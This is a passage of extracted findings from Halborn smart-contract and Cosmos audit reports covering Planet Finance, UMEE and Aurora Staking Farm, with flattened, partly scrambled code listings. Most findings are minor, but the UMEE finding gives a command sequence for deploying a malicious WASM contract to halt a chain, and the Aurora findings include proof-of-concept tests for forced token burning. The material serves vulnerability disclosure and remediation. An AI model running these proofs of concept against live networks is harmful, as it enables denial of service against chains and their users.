underlying_.  _setPendingAdmin lacks a zero address check on newPendingAdmin.  In contract gToken_Delegator.sol:  changeAddress lacks a zero address check on _newgGammaAddress, _newGammatroller, _newOracle.  constructor lacks a zero address check on admin_.  _setImplementation lacks a zero address check on implementation_ .  In contract Maximillion.sol:  _setPendingAdmin lacks a zero address check on newPendingAdmin.  In contract PlanetDiscountDelegate.sol:  changeAddress lacks a zero address check on _newgGammaAddress, _newGammatroller, _newOracle.  In contract PlanetDiscountDelegator.sol:  constructor lacks a zero address check on admin_.  _setAdmin lacks a zero address check on newAdmin.  _setImplementation lacks a zero address check on implementation_ .  In contract Reservoir.sol:  changeFoundationAddress lacks a zero address check on _newFoundation.  changeTreasuryAddress lacks a zero address check on _newTreasury . 37  In contract Unitroller.sol:  _setPendingAdmin lacks a zero address check on newPendingAdmin, newPendingAdmin.  _setPendingImplementation newPendingImplementation. lacks a zero address check on Zero Address Validation missing before address assignment to these state variable. Listing 13: Gammatroller.sol 1 2 3 4 5 pendingGammatrollerImplementation = newPendingImplementation (#448) pendingAdmin = newPendingAdmin (#497) pendingAdmin = newPendingAdmin (#3004) borrowCapGuardian = newBorrowCapGuardian (#4304) pauseGuardian = newPauseGuardian (#4324) Listing 14: gAQUA_Delegate.sol 1 2 underlying = underlying_ (#2918) pendingAdmin = newPendingAdmin (#2560) Listing 15: gAQUA_Delegator.sol 1 2 3 4 5 gGammaAddress = _newgGammaAddress (#636) gammatroller = _newGammatroller (#637) oracle = _newOracle (#638) admin = admin_ (#1225) implementation = implementation_ (#1242) Listing 16: gBNB.sol 1 pendingAdmin = newPendingAdmin (#2269) Listing 17: gGAMMA_Delegate.sol 1 2 underlying = underlying_ (#2833) pendingAdmin = newPendingAdmin (#2434) 38 3 withdrawFeeAddress = newWithdrawFeeAddress (#2705) Listing 18: gGAMMA_Delegator.sol 1 2 admin = admin_ (#573) implementation = implementation_ (#590) Listing 19: gToken_Delegate.sol 1 2 underlying = underlying_ (#2919) pendingAdmin = newPendingAdmin (#2561) Listing 20: gToken_Delegator.sol 1 2 3 4 5 gGammaAddress = _newgGammaAddress (#636) gammatroller = _newGammatroller (#637) oracle = _newOracle (#638) admin = admin_ (#1225) implementation = implementation_ (#1242) Listing 21: Maximillion.sol 1 pendingAdmin = newPendingAdmin (#2240) Listing 22: PlanetDiscountDelegate.sol 1 2 3 gGammaAddress = _newgGammaAddress (#743) gammatroller = _newGammatroller (#744) oracle = _newOracle (#745) Listing 23: PlanetDiscountDelegator.sol 1 2 3 admin = admin_ (#14) implementation = implementation_ (#25) admin = newAdmin (#38) 39 Listing 24: Reservoir.sol 1 2 foundation = _newFoundation (#420) treasury = _newTreasury (#430) Listing 25: Unitroller.sol 1 2 3 pendingAdmin = newPendingAdmin (#2119) pendingGammatrollerImplementation = newPendingImplementation (#2499) pendingAdmin = newPendingAdmin (#2550) Risk Level: Likelihood - 2 Impact - 2 Recommendation: Although administrative restrictions are imposed to this function due to the role-based access controls (RBAC), it is recommended to add proper address validation when assigning user supplied input to a variable. This could be as simple as using the following statement: Listing 26 1 require ( address_input != 0 , \" Address is zero \" ) Remediation Plan: RISK ACCEPTED: The Planet Finance team accepts the risk for this issue. 40 ", "labels": ["Halborn", "Planet_Finance_Green", "Severity: Low"]}, {"title": "EXPERIMENTAL FEATURES ENABLED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Planet_Finance_Green_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "ABIEncoderV2 is enabled to be able to pass struct type into a function, both web3 and another contract. The use of experimental features could be dangerous on live deployments. The experimental ABI encoder does not handle non-integer values shorter than 32 bytes properly. This applies to bytesNN types, bool, enum and other types when they are part of an array or a struct and encoded directly from storage. This means these storage references have to be used directly inside abi.encode(. . . ) as arguments in external function calls or in event data without prior assignment to The types a local variable. bytesNN and bool will result in corrupted data, while enum might lead to an invalid revert. Using return does not trigger the bug. Furthermore, arrays with elements shorter than 32 bytes may not be handled correctly, even if the base type is an integer type. Encoding such arrays in the way described above can lead to other data in the encoding being overwritten if the number of elements encoded is not a multiple of the number of elements that fit a single slot. If nothing follows the array in the encoding (note that dynamically sized arrays are always encoded after statically sized arrays with statically sized content), or if only a single array is encoded, no other data is overwritten. There are known bugs that are publicly released while using this feature. However, the bug only manifests itself when all the following conditions are met: Storage data involving arrays or structs is sent directly to an external function call, to abi.encode or to event data without prior assignment to a local (memory) variable. There is an array that contains elements with size less than 32 bytes or a struct that has elements that share a storage slot or members of type bytesNN shorter than 32 bytes. In addition to that, in the following situations, the code is NOT affected: All the structs or arrays only use uint256 or int256 types. 41 If only using integer types (that may be shorter) and only encode at most one array at a time. If only returning such data and do not use it in abi.encode, external calls or event data. ABIEncoderV2 is enabled to be able to pass struct type into a function, both web3 and another contract. Naturally, any bug can have wildly varying consequences depending on the program control flow, but we expect that this is more likely to lead to malfunction than exploitability. The bug, when triggered, will under certain circumstances send corrupt parameters on method invocations to other contracts. Code Location: Listing 27 1 Gammatroller . sol #8: pragma experimental ABIEncoderV2 ; 2 UniswapConfig . sol #4: pragma experimental ABIEncoderV2 ; 3 GAMMA . sol #6: pragma experimental ABIEncoderV2 ; 4 UniswapAnchoredView . sol #4: pragma experimental ABIEncoderV2 ; Risk Level: Likelihood - 2 Impact - 2 Recommendation: When possible, do not use experimental features in the final live de- ployment. Validate and check that all the conditions above are true for integers and arrays (i.e., all using uint256). Reference: Solidity Optimizer and ABIEncoderV2 Bug 42 Remediation Plan: RISK ACCEPTED: The Planet Finance team accepts the risk for this issue. 43 ", "labels": ["Halborn", "Planet_Finance_Green", "Severity: Low"]}, {"title": "PRAGMA VERSION DEPRECATED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Planet_Finance_Green_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the Green contracts, the current pragma version in use for the con- tracts is pragma 0.5.16, 0.5.17, and 0.5.8. While this version is still functional, and some security issues safely implemented by mitigating contracts with other utility contracts such as SafeMath.sol, the risk to the long-term sustainability and integrity of the solidity code increases. Code Location: Listing 28 1 BNB_INTEREST_RATE_MODEL . sol : pragma solidity ^0.5.16; 2 GAMMA . sol : pragma solidity ^0.5.16; 3 Gammatroller . sol : pragma solidity ^0.5.16; 4 Maximillion . sol : pragma solidity ^0.5.8; 5 Maximillion . sol : pragma solidity ^0.5.16; 6 PlanetDiscountDelegate . sol : pragma solidity ^0.5.16; 7 PlanetDiscountDelegator . sol : pragma solidity ^0.5.16; 8 PlanetDiscountStorage . sol : pragma solidity ^0.5.17; 9 Reservoir . sol : pragma solidity ^0.5.17; 10 Unitroller . sol : pragma solidity ^0.5.8; 11 gAQUA_Delegate . sol : pragma solidity ^0.5.16; 12 gAQUA_Delegator . sol : pragma solidity ^0.5.16; 13 gBNB . sol : pragma solidity ^0.5.8; 14 gGAMMA_Delegate . sol : pragma solidity ^0.5.16; 15 gGAMMA_Delegator . sol : pragma solidity ^0.5.16; 16 gToken_Delegate . sol : pragma solidity ^0.5.16; 17 gToken_Delegator . sol : pragma solidity ^0.5.16; 18 interestRateModel . sol : pragma solidity ^0.5.16; Risk Level: Likelihood - 2 Impact - 2 44 Recommendation: If possible, consider using the latest stable pragma version that has been thoroughly tested to prevent potential undiscovered vulnerabilities, such as pragma between 0.6.12 - 0.7.6, or the latest pragma 0.8.9. For example, after the Solidity version 0.8.0 arithmetic operations revert to underflow and overflow by default, by using this version, utility contracts like SafeMath.sol would not be needed. Remediation Plan: RISK ACCEPTED: The Planet Finance team accepts the risk for this issue. 45 ", "labels": ["Halborn", "Planet_Finance_Green", "Severity: Low"]}, {"title": "MULTIPLE PRAGMA DEFINITION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Planet_Finance_Green_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Planet Finance contracts use different pragma versions. Contracts should be deployed with the same compiler version and flags that they have been tested with thoroughly. Locking the pragma helps to ensure that contracts do not accidentally get deployed using another pragma, for example, either an outdated pragma ver- sion that might introduce bugs that affect the contract system negatively or a recently released pragma version which has not been extensively tested. The latest pragma version (0.8.9) was released in September 2021. Many pragma versions have been lately released, going from version 0.7.x to the recently released version 0.8.x. in just 8 months. Reference: https://github.com/ethereum/solidity/releases In the Solitidy Github repository, there is a json file with all bugs It should be noted that finding in the different compiler versions. pragma 0.6.12 and 0.7.6 are widely used by Solidity developers and have been extensively tested in many security audits. Reference: https://github.com/ethereum/solidity/blob/develop/docs/bugs_- by_version.json Recommendation: Consider locking and using a single pragma version without known bugs for the compiler version. If possible, consider using the latest stable pragma version that has been thoroughly tested to prevent potential undiscovered vulnerabilities, such as pragma between 0.6.12 - 0.7.6, or the latest pragma 0.8.0 - 0.8.9. For example, after the Solidity version 0.8.0 arithmetic operations revert to underflow and overflow by default, by using this version, utility contracts like SafeMath.sol would not be needed. 46 Remediation Plan: RISK ACCEPTED: The Planet Finance team accepts the risk for this issue. 47 3.10 (HAL-10) FLOATING PRAGMA - LOW ", "labels": ["Halborn", "Planet_Finance_Green", "Severity: Informational"]}, {"title": "VULNERABLE WASM SMART CONTRACT LEADS TO CHAIN HALT", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/UMEE_WASM_Integration_Cosmos_Security_Audit_Report_Halborn_Final.pdf", "body": "A vulnerability in the WASM integration and the authz module in the cosmos -sdk has been detected, and was recently exploited to halt another chain (JUNO). In the vulnerability, A smart contract abused non-deterministic state in authz grants to save a different hash to all validators. Juno Halt Root Cause Steps:  An attacker is deployed a malicious contract on the Juno.  A malicious contract is located on the Mint Scan.  During the review of malicious contract, It has been observed that an attackers contract is calling Authz Module MsgGrant and MsgRevoke. 15  The smart contract leads to a non-determinism in Authzs MsgGrant where the grant expiration was suspected to default to the nodes OS time if unset by the message sender.  The reply() feature of CosmWasm allows calling a message and get- With a couple of messages, a non- ting back its output events. deterministic event ordering occurred in the Authz module, which causes chain halt. Proof Of Concept: A summary of the steps:  Deploy malicious contract to UMEE.  Execute MsgExecuteContract in a loop.  The chain will be halted. Listing 1: Deploy malicious WASM contract proposal into the UMEE with this command 1 echo y | umeed tx gov submit - proposal wasm - store malicious . wasm --  title \" JUNO POC \" -- run - as $( umeed keys show user1 -- keyring - 16 1 >/ dev / null 2 >/ dev / null  backend = test -a ) -- chain - id testhub -- description \" JUNO POC \" --  from user1 -- keyring - backend test -- gas 100000000 -b block 1 >/ dev /  null 2 >/ dev / null 2 3 echo y | umeed tx gov deposit 1 100000000 uumee -- from user1 --  keyring - backend test -- chain - id testhub -y -b block -- gas 7000000  -- gas - prices 0.025 uumee 4 echo y | umeed tx gov vote 1 yes -- from user1 -- keyring - backend test  -- chain - id testhub -y -b block -- gas 400000 -- gas - prices 0.025  uumee 5 6 echo y | umeed tx gov deposit 1 100000000 uumee -- from user2 --  keyring - backend test -- chain - id testhub -y -b block -- gas 7000000  -- gas - prices 0.025 uumee 7 echo y | umeed tx gov vote 1 yes -- from user2 -- keyring - backend test  -- chain - id testhub -y -b block -- gas 400000 -- gas - prices 0.025  uumee 1 >/ dev / null 2 >/ dev / null 1 >/ dev / null 2 >/ dev / null 1 >/ dev / null 2 >/ dev / null Listing 2: Instantiate contract with this parameter. 1 INIT =\" {\\ \" admin \\ \": \\\" address \\ \" }\" 2 echo y | umeed tx wasm instantiate 1 \" $INIT \" -- admin $( umeed keys  show user1 -- keyring - backend = test -a) -- from user1 -- keyring -  backend test -- amount = \" 100 uumee \" -- label \" juno - poc \" -- gas 1000000  -y -- chain - id testhub -b block Listing 3: Call MsgExecuteContract with this command in a for loop. An attacker sent 150 Messages through contract 1 MESSAGE = \" {\\ \" custom_msg1 \\\" : {\\ \" grantee \\\" : \\ \" $( umeed keys show user1  -- keyring - backend = test -a )\\ \" }} \" 2 umeed tx wasm execute $CONTRACT_ADDR \" $MESSAGE \"  keyring - backend test -- chain - id testhub -y -b block -- gas  100000000 -- from user1 -- Chain will be halted due to non-deterministic state. Code Location: Location 17 Listing 4 1 2 3 4 5 6 7 8 9 10 11 12  c98217689d 13 14 15 16 17 18 19 20 21 22 23 24 25 26 github . com / CosmWasm / wasmd v0 .25.0 github . com / CosmWasm / wasmvm v1 .0.0 - beta10 github . com / cosmos / cosmos - sdk v0 .45.6 github . com / cosmos / go - bip39 v1 .0.0 github . com / cosmos / ibc - go / v2 v2 .3.0 github . com / ethereum /go - ethereum v1 .10.19 github . com / gogo / protobuf v1 .3.3 github . com / golang / protobuf v1 .5.2 github . com / golangci / golangci - lint v1 .47.1 github . com / gorilla / mux v1 .8.0 github . com / grpc - ecosystem / grpc - gateway v1 .16.0 github . com / hashicorp / golang - lru v0 .5.5 -0.20210104140557 -80 github . com / ignite / cli v0 .22.2 github . com / ory / dockertest / v3 v3 .9.1 github . com / osmosis - labs / bech32 - ibc v0 .2.0 - rc2 github . com / rs / zerolog v1 .27.0 github . com / spf13 / cast v1 .5.0 github . com / spf13 / cobra v1 .5.0 github . com / spf13 / pflag v1 .0.5 github . com / spf13 / viper v1 .12.0 github . com / stretchr / testify v1 .8.0 github . com / tendermint / tendermint v0 .34.19 github . com / tendermint / tm - db v0 .6.7 google . golang . org / genproto v0 .0.0 -20220519153652 -3 a47de7e79bd google . golang . org / grpc v1 .46.2 gopkg . in / yaml . v3 v3 .0.1 Risk Level: Likelihood - 5 Impact - 5 Recommendation: The following update has been released for cosmos-sdk & wasm which should be applied before this integration is released publicly: 18 PR 12692 Wasm Fix Cosmos SDK Update Take note that this has been fixed in the latest version of cosmos-sdk & wasm, but deploying this upgrade might have unintended consequences. Remediation Plan: PENDING: The UMEE Team does not allow contracts to be executed without permission on the chain, they will consider fixing in the future. 19 ", "labels": ["Halborn", "UMEE_WASM_Integration_Cosmos", "Severity: Critical"]}, {"title": "WASM CONFIG PARAMETERS ARE NOT COMPATIBLE WITH RECENT COSMWASM SDK", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/UMEE_WASM_Integration_Cosmos_Security_Audit_Report_Halborn_Final.pdf", "body": "During the code review, It has been noticed that the pre-defined param- eters are incompatible with the recent wasmd keeper. From the following link, DefaultCompileCost is incompatible with recent wasmd module. On the other hand, DefaultGasMultiplier is not defined. Code Location: Location Listing 5 1 const ( 2  wasmd 3 4 5 6 ) // DefaultUmeeWasmInstanceCost is initially set the same as in DefaultUmeeWasmInstanceCost uint64 = 60 _000 // DefaultUmeeWasmCompileCost cost per byte compiled DefaultUmeeWasmCompileCost uint64 = 100 Risk Level: Likelihood - 1 Impact - 3 Recommendation: Ensure that all selected values are compatible with recent wasmd and will not lead to any inconsistency on the integration. 20 Remediation Plan: PENDING: The UMEE Team will fix this issue in a future release. 21 ", "labels": ["Halborn", "UMEE_WASM_Integration_Cosmos", "Severity: Low"]}, {"title": "NEW QUERIES ARE NOT ADDED INTO THE HANDLER", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/UMEE_WASM_Integration_Cosmos_Security_Audit_Report_Halborn_Final.pdf", "body": "SlashWindow In the recent branch, SlashWindow query has been added. queries the current slash window progress of the oracle. However, the query is not added into the wasm handlers. Code Location: Location Listing 6 return nil , status . Error ( codes . InvalidArgument , \" empty } if req == nil { goCtx context . Context , req * types . QuerySlashWindow , ctx := sdk . UnwrapSDKContext ( goCtx ) params := q . GetParams ( ctx ) 1 func ( q querier ) SlashWindow ( 2 3 4 ) (* types . QuerySlashWindowResponse , error ) { 5 6  request \" ) 7 8 9 10 11 12 13 14 15 16 17 18  slashWindow ) 19 20 21 22 23 } return & types . QuerySlashWindowResponse { }, nil slashWindow := params . SlashWindow votePeriod := params . VotePeriod currentBlock := uint64 ( ctx . BlockHeight () ) votePeriodsPerSlashWindow := slashWindow / votePeriod currentSlashWindow := currentBlock / votePeriodsPerSlashWindow blocksIntoSlashWindow := currentBlock - ( currentSlashWindow * WindowProgress : blocksIntoSlashWindow / votePeriod , 22 Risk Level: Likelihood - 1 Impact - 3 Recommendation: It is recommended to handle all available GRPC queries through wasm. Remediation Plan: PENDING: The UMEE Team will fix this issue in a future release. 23 ", "labels": ["Halborn", "UMEE_WASM_Integration_Cosmos", "Severity: Low"]}, {"title": "VULNERABLE 3RD PARTY PACKAGES", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/UMEE_WASM_Integration_Cosmos_Security_Audit_Report_Halborn_Final.pdf", "body": "There are a few 3rd party packages that are being used that contain vulnerabilities. Packages: ID sonatype-2021-0598 sonatype-2022-3945 sonatype-2021-0456 sonatype-2021-0076 CVE-2022-23328 Package tendermint go-buffer-poo websocket go-ethereum go-ethereum Rating MEDIUM MEDIUM HIGH HIGH HIGH Description Improper Input Validation Integer Overflow or Wraparound Uncontrolled Resource Consumption Uncontrolled Resource Consumption Denial of Service attack Risk Level: Likelihood - 1 Impact - 2 Recommendation: We recommend that all third-party packages that are implemented are kept up to date and all security fixes applied. Remediation Plan: PENDING: The UMEE Team will fix this issue in a future release. 24 ", "labels": ["Halborn", "UMEE_WASM_Integration_Cosmos", "Severity: Informational"]}, {"title": "UNHANDLED ERRORS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/UMEE_WASM_Integration_Cosmos_Security_Audit_Report_Halborn_Final.pdf", "body": "There are a few instances where error handling has not been implemented for functions that might return an error. Code Location: price-feeder/oracle/provider/huobi.go, Lines 384-387 Listing 7: (Line 385) 384 func ( p * HuobiProvider ) reconnect () error { 385 386 387 p. wsClient . Close () p. logger . Debug () . Msg ( \" reconnecting websocket \" ) price-feeder/oracle/provider/gate.go, Lines 548-551 Listing 8: (Line 549) 548 func ( p * GateProvider ) reconnect () error { 549 550 551 p. wsClient . Close () p. logger . Debug () . Msg ( \" reconnecting websocket \" ) price-feeder/oracle/provider/coinbase.go, Lines 482-485 Listing 9: (Line 483) 482 func ( p * CoinbaseProvider ) reconnect () error { 483 484 485 p. logger . Debug () . Msg ( \" reconnecting websocket \" ) p. wsClient . Close () 25 price-feeder/oracle/provider/binance.go, Lines 362-366 Listing 10: (Line 363) 362 func ( p * BinanceProvider ) reconnect () error { 363 364 365 p. logger . Debug () . Msg ( \" reconnecting websocket \" ) p. wsClient . Close () Risk Level: Likelihood - 1 Impact - 1 Recommendation: We recommend that the appropriate error checking be implemented to avoid unexpected crashes. Remediation Plan: SOLVED: The UMEE Team has implemented the correct error handling on Issue 1192. 26 ", "labels": ["Halborn", "UMEE_WASM_Integration_Cosmos", "Severity: Informational"]}, {"title": "DUPLICATED ERROR CHECKS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/UMEE_WASM_Integration_Cosmos_Security_Audit_Report_Halborn_Final.pdf", "body": "There are two instances where an error check is not required, and the logic can be adjusted to only return the value. Code Location: x/leverage/types/tx.go, Lines 115-121 Listing 11: (Lines 117-120) _ , err := sdk . AccAddressFromBech32 ( msg . Borrower ) if err != nil { 115 func ( msg * MsgDecollateralize ) ValidateBasic () error { 116 117 118 119 120 121 } } return nil return err x/leverage/types/tx.go, Lines 86-92 Listing 12: (Lines 88-91) 86 func ( msg * MsgCollateralize ) ValidateBasic () error { _ , err := sdk . AccAddressFromBech32 ( msg . Borrower ) 87 88 if err != nil { 89 90 91 92 } } return nil return err 27 Risk Level: Likelihood - 1 Impact - 1 Recommendation: As the err variable will already be nil if no error has been generated by the function, the following piece of code will be sufficient: Listing 13 1 _ , err := sdk . AccAddressFromBech32 ( msg . Borrower ) 2 return err Remediation Plan: SOLVED: The UMEE Team has implemented the correct error handling on Issue 1194. 28 ", "labels": ["Halborn", "UMEE_WASM_Integration_Cosmos", "Severity: Informational"]}, {"title": "HTML ESCAPING NOT IMPLEMENTED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/UMEE_WASM_Integration_Cosmos_Security_Audit_Report_Halborn_Final.pdf", "body": "It was found that Write is being used to generate HTTP responses, instead of using the html/template package that handles HTML and other encodings more safely. Code Location: price-feeder/router/v1/router.go, Line 113 Listing 14: (Line 113) 113 _ , _ = w. Write ( gr . Metrics ) price-feeder/router/v1/response.go, Line 48 Listing 15: (Line 48) 48 _ , _ = w . Write ( bz ) Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to use the html/template package when returning data back during an HTTP response. 29 Remediation Plan: SOLVED: The UMEE Team has implemented the correct error handling on Issue 1195. 30 ", "labels": ["Halborn", "UMEE_WASM_Integration_Cosmos", "Severity: Informational"]}, {"title": "PANIC IS USED FOR ERROR HANDLING", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/UMEE_WASM_Integration_Cosmos_Security_Audit_Report_Halborn_Final.pdf", "body": "Several instances of the panic function were identified in the codebase. They appear to be used to handle errors. This can cause potential issues, as invoking a panic can cause the program to halt execution and crash in some cases. This in turn can negatively impact the availability of the software for users. Code Location: The following are just a few samples of the usage of panic. x/leverage/abci.go, Lines 11-21 Listing 16: (Lines 13,17) } panic ( err ) if err := k . SweepBadDebts ( ctx ); err != nil { 11 func EndBlocker ( ctx sdk . Context , k keeper . Keeper ) [] abci .  ValidatorUpdate { 12 13 14 15 16 17 18 19 20 21 } if err := k . AccrueAllInterest ( ctx ); err != nil { return [] abci . ValidatorUpdate {} panic ( err ) } xx/leverage/keeper/keeper.go, Lines 64-66 Listing 17: (Line 65) 64 65 66 if k . hooks != nil { panic ( \" leverage hooks already set \" ) } 31 Risk Level: Likelihood - 1 Impact - 1 Recommendation: Instead of using panics, custom errors should be defined and handled according to the Cosmos best practices. Remediation Plan: ACKNOWLEDGED: The UMEE Team acknowledged this finding. 32 ", "labels": ["Halborn", "UMEE_WASM_Integration_Cosmos", "Severity: Informational"]}, {"title": "OPEN TODOs", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/UMEE_WASM_Integration_Cosmos_Security_Audit_Report_Halborn_Final.pdf", "body": "Open To-dos can point to architecture or programming issues that still need to be resolved. Often these kinds of comments indicate areas of complexity or confusion for developers. This provides value and insight to an attacker who aims to cause damage to the protocol. Code Location: TO-DO: Listing 18: Open Todos 1 ./ x / leverage / module . go :28:  implements simulator and then uncomment . 2 ./ x / leverage / keeper / interest . go :164: 3 ./ x / leverage / keeper / interest . go :76:  when tendermint solves #8773 // TODO : Ensure x / leverage // TODO : use typed events // @todo fix this Risk Level: Likelihood - 1 Impact - 1 Recommendation: Consider resolving the To-dos before deploying code to a production context. Use an independent issue tracker or other project management software to track development tasks. 33 Remediation Plan: ACKNOWLEDGED: The UMEE Team acknowledged this finding. 34 ", "labels": ["Halborn", "UMEE_WASM_Integration_Cosmos", "Severity: Informational"]}, {"title": "HAL01", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/Aurora_Staking_Farm_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The unstake_burn() and burn() functions in staking-farm/src/stake.rs can be publicly callable by anyone, allowing malicious users to continu- ally call the functions with each new epoch, which leads to the reduction of the total stakes in the pool, which would result in fewer rewards for each user who stakes and the transfer of all unstaked tokens to address zero. Code Location: Listing 1: staking-farm/src/stake.rs 127 pub fn unstake_burn (& mut self ) { 128 self . internal_unstake_all (& AccountId :: new_unchecked (  ZERO_ADDRESS . to_string () )) ; 129 } Listing 2: staking-farm/src/stake.rs 132 pub fn burn (& mut self ) { 133 let account_id = AccountId :: new_unchecked ( ZERO_ADDRESS .  to_string () ); 134 135 136 137 138 139 } let account = self . internal_get_account (& account_id ); if account . unstaked > MIN_BURN_AMOUNT { // TODO : replace with burn host function when available . self . internal_withdraw (& account_id , account . unstaked ); } 15 Proof of Concept: The following test case was developed to showcase the issue: Listing 3 assert_all_success ( call! ( user1 , pool . unstake_burn () )) ; println! (\" Unstaked balance : {} \" , to_int ( view! ( pool . let ( root , pool ) = setup ( to_yocto (\" 5 \") , 1, 3) ; let user1 = create_user_no_stake (& root , & pool ); wait_epoch (& root ); assert_all_success ( call! ( root , pool . ping () )) ; wait_epoch (& root ); // User forces all of the zero address account 's tokens to be 1 fn public_token_burning () { 2 3 4 5 6 7  unstaked 8 9  get_account_unstaked_balance ( burn_account () )) )); 10  address account ( effectively burning them ) 11 12 13 14 15 16 17  get_account_unstaked_balance ( burn_account () )) )); 18 } wait_epoch (& root ); wait_epoch (& root ); wait_epoch (& root ); wait_epoch (& root ); assert_all_success ( call! ( user1 , pool . burn () )) ; // Zero address should have zero unstaked tokens println! (\" Unstaked balance : {} \" , to_int ( view! ( pool . // Wait for epochs before funds can be withdrawn to the zero Risk Level: Likelihood - 4 Impact - 5 Recommendation: Check if the owner is calling the functions before executing their logic, otherwise revert. 16 Remediation Plan: NOT APPLICABLE: The team accepts this behavior as it is intentional based on the reasoning at https://github.com/referencedev/staking-farm# burning-rewards 17 ", "labels": ["Halborn", "Aurora_Staking_Farm_NEAR", "Severity: High"]}, {"title": "HAL02", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/Aurora_Staking_Farm_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "It was observed that most of the privileged functionality is controlled by the owner. Additional authorization levels are needed to implement the principle of least privilege, also known as least authority, which ensures that only authorized processes, users, or programs can access necessary resources or information. Role ownership is useful in a simple system, but more complex projects require more roles by using role-based access control policy. Code Location: The owner can access those functions:  stop_farm function in farm.rs  All functions in owner.rs Risk Level: Likelihood - 3 Impact - 5 Recommendation: Adding additional roles is recommended to adhere to the principle of least privilege and limit owner privileges. You can include the pauser role and change assert_owner_or_authorized_user() to allow only authorized users to perform actions. Also, do not allow the owner to be set as an authorized user via add_authorized_user. 18 Remediation Plan: pauser permissions PARTIALLY SOLVED: The Aurora team introduced a fix that separates owner https://github.com/referencedev/staking- and farm/pull/11. However, the fix is partial, since the owner can still become a pauser and the pausers list could become empty by removing all pausers. in 19 ", "labels": ["Halborn", "Aurora_Staking_Farm_NEAR", "Severity: High"]}, {"title": "HAL03", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/Aurora_Staking_Farm_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The internal_restake() function in staking-farm/src/internal.rs checks if the contract is paused before performing its internal logic, however multiple functions that perform other staking actions do not perform that check before execution, allowing staking actions to be carried out even when staking is paused. Such functions include internal_stake() and inner_unstake(). Risk Level: Likelihood - 2 Impact - 5 Recommendation: All functions that perform logic that affects staking actions should start by checking whether the contract is paused or not. Remediation Plan: SOLVED: The Aurora team fixed this issue in https://github.com/referencedev/staking- farm/pull/11. 20 ", "labels": ["Halborn", "Aurora_Staking_Farm_NEAR", "Severity: Medium"]}, {"title": "HAL04", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/Aurora_Staking_Farm_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "When a new instance of StakingContract is created, a burn fraction has to be provided and is then used to determine the amount of tokens burned with each call to the ping() function. An assert_valid() function is implemented on the Ratio struct that represents the fraction, however it is never called on the passed fraction value before it is used in the StakingContract. This allows an owner to carry out the following scenarios: Create a staking pool with a burn fraction that evaluates to 1, 1. meaning all rewards will be burned and nothing will remain for the owner and delegators 2. Create a staking pool with a burn fraction that evaluates to more than 1, which will cause a panic case every time internal_ping() is called Create a staking pool with a burn fraction that evaluates to 0, 3. meaning nothing will ever burn, which would allow the owner to basically harvest all the rewards if they set the reward fee to a fraction that evaluates to 1 Code Location: Listing 4: staking-farm/src/lib.rs (Lines 198,221) pub fn new ( owner_id : AccountId , stake_public_key : PublicKey , reward_fee_fraction : Ratio , burn_fee_fraction : Ratio , ) -> Self { 193 #[ init ] 194 195 196 197 198 199 200 201 202 assert! ( !env :: state_exists () , \" Already initialized \" ); reward_fee_fraction . assert_valid () ; assert! ( 21 203 204 205 206 207 env :: is_valid_account_id ( owner_id . as_bytes () ) , \" The owner account ID is invalid \" ); let account_balance = env :: account_balance () ; let total_staked_balance = account_balance -  STAKE_SHARE_PRICE_GUARANTEE_FUND ; 208 209 210 211 assert_eq! ( env :: account_locked_balance () , 0, \" The staking pool shouldn 't be staking at the  initialization \" 212 213 214 215 216 217 218 ); let mut this = Self { stake_public_key : stake_public_key . into () , last_epoch_height : env :: epoch_height () , last_total_balance : account_balance , total_staked_balance , total_stake_shares : NumStakeShares :: from (  total_staked_balance ) , 219 220 total_burn_shares : 0, reward_fee_fraction : UpdatableRewardFee :: new (  reward_fee_fraction ) , 221 222 223 224 225 226 burn_fee_fraction , accounts : UnorderedMap :: new ( StorageKeys :: Accounts ) , farms : Vector :: new ( StorageKeys :: Farms ) , active_farms : Vec :: new () , paused : false , authorized_users : UnorderedSet :: new ( StorageKeys ::  AuthorizedUsers ) , 227 authorized_farm_tokens : UnorderedSet :: new ( StorageKeys  :: AuthorizedFarmTokens ) , 228 }; Proof of Concept:: Test cases were done and indeed they resulted in 0 rewards, panic and the owner collected the full reward for the 3 cases mentioned above, respectively: 22 Listing 5: Burning all rewards let ( root , pool ) = setup ( to_yocto (\" 10000 \" ) + 1 _000_000_000_000 1 fn burn_all_rewards () { 2  , 10 , 10) ; 3 4 5 6 7 8 9 } let _ = create_user_and_stake (& root , & pool ); wait_epoch (& root ); assert_all_success ( call! ( root , pool . ping () )) ; wait_epoch (& root ); assert_all_success ( call! ( root , pool . ping () )) ; Listing 6: Panic on every ping() function call let ( root , pool ) = setup ( to_yocto (\" 10000 \" ) + 1 _000_000_000_000 1 fn panic_on_ping () { 2  , 10 , 11) ; 3 4 5 6 } let _ = create_user_and_stake (& root , & pool ); wait_epoch (& root ); assert_all_success ( call! ( root , pool . 